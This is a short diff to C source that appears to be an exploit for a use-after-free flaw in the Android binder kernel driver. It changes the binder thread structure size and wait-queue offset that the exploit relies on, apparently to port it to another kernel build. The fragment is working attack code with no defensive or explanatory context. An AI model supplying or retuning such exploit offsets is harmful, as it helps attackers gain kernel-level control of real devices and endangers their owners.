@@ -65,9 +65,9 @@
 #define MAX(x, y) ((x) > (y) ? (x) : (y))
 
 #define BINDER_THREAD_EXIT 0x40046208ul
-#define BINDER_THREAD_SZ 0x198
+#define BINDER_THREAD_SZ 0x188 // 0x190 - 0x8
 #define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
-#define WAITQUEUE_OFFSET (0xA8)
+#define WAITQUEUE_OFFSET (0x98)
 #define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10
 #define UAF_SPINLOCK 0x10001
 #define PAGE 0x1000ul
